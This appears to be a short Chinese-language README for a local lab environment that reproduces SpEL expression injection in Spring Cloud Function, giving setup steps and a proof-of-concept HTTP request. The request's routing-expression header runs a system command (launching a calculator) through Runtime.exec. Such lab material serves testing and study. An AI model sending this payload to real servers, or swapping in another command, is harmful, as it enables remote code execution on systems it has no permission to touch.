# Spring-Cloud-Function-SpEL
一个用于Spring Cloud Function SpEL表达式注入的测试环境\
版本 java11 运行 java -jar demo-0.0.1-SNAPSHOT.jar 启动\
\
搭建完成访问127.0.0.1:8080端口\
![image](https://user-images.githubusercontent.com/88339946/160252763-dcdab609-08a5-4d70-afb0-0f8870d64f82.png)
```POST /xxx HTTP/1.1
Host: 127.0.0.1:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

xxx
```
![ed8de6718b7501e80a470a96293aa37](https://user-images.githubusercontent.com/88339946/160252782-8173cb68-e9bc-4337-86fd-36dc9feddce7.jpg)
